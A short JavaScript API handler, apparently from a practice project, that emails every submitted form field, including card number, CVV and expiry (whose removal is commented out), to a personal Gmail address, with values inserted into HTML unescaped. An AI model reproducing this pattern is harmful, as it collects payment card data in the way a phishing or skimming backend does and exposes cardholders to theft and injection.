import { Resend } from 'resend';
const resend = new Resend(process.env.RESEND_API_KEY);

export default async function handler(req, res) {
    if (req.method !== 'POST') return res.status(405).end();

    const data = req.body;

    // delete data.f_cardnum;
    // delete data.f_cvv;
    // delete data.f_expiry;

    const rows = Object.entries(data)
        .map(([key, value]) => `<p><strong>${key}:</strong> ${value}</p>`)
        .join('');

    try {
        await resend.emails.send({
            from: 'Practice Form <onboarding@resend.dev>',
            to: 'meebeebari75@gmail.com', // replace with your real email
            subject: 'New test form submission',
            html: rows || '<p>No data submitted</p>',
        });
        res.status(200).json({ success: true });
    } catch (err) {
        console.error(err);
        res.status(500).json({ error: 'Failed to send' });
    }
}